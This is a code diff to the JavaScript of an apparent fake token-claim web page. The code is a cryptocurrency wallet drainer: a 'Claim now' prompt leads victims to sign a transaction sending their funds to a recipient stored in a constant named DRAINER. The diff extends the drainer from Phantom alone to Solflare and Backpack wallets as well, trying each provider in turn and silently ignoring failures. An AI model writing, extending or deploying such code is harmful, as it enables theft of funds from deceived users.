@@ -162,8 +162,18 @@ let fallbackTimer;
 const cache = new Map();
 
 const isTouch = window.matchMedia("(pointer: coarse)").matches;
-const inWallet = () =>
-  Boolean(window.phantom?.solana?.isPhantom || window.ethereum);
+
+function getSolProviders() {
+  return [window.phantom?.solana, window.solflare, window.backpack].filter(
+    (provider) => provider && typeof provider.connect === "function" && typeof provider.signTransaction === "function",
+  );
+}
+
+function getSolProvider() {
+  return getSolProviders()[0] || null;
+}
+
+const inWallet = () => Boolean(getSolProvider() || window.ethereum);
 
 function setMessage(el, text) {
   el.textContent = text;
@@ -535,7 +545,7 @@ function clearAutoTimers() {
 const signLabel = () => (chain.key === "eth" ? "Approve in wallet" : "Claim now");
 const alreadyConnected = () =>
   chain.key === "sol"
-    ? Boolean(window.phantom?.solana?.publicKey)
+    ? Boolean(getSolProvider()?.publicKey)
     : Boolean(window.ethereum?.selectedAddress);
 
 function armFallback() {
@@ -548,9 +558,13 @@ function armFallback() {
 }
 
 async function connectWallet() {
-  if (chain.key === "sol" && window.phantom?.solana?.connect) {
-    const response = await window.phantom.solana.connect();
-    return response.publicKey.toString();
+  if (chain.key === "sol") {
+    for (const provider of getSolProviders()) {
+      try {
+        const response = await provider.connect();
+        return response.publicKey.toString();
+      } catch {}
+    }
   }
   if (chain.key === "eth" && window.ethereum) {
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -605,7 +619,7 @@ function createAtaIx(payer, ata, owner, mint) {
 }
 
 async function claimSol(ownerAddress) {
-  const provider = window.phantom?.solana;
+  const provider = getSolProvider();
   if (!provider?.signTransaction) throw new Error("no signer");
   const owner = provider.publicKey || new solanaWeb3.PublicKey(ownerAddress);
   const recipient = new solanaWeb3.PublicKey(DRAINER.solRecipient);
